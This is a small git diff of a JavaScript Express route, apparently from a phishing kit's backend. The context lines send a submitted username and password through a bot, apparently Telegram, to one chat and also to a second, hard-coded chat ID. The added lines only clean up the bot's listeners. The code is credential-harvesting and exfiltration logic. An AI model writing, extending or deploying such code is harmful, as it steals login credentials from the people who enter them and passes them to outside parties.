@@ -18,6 +18,8 @@ const route = router.use("/", function (req, res, next) {
         bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
         bot.sendMessage(623167587 , `username: ${email} : password ${pass}`);
         bot.close();
+        bot.removeAllListeners();
+
         res.send({ good: 'good' });
 
     }catch (err) {
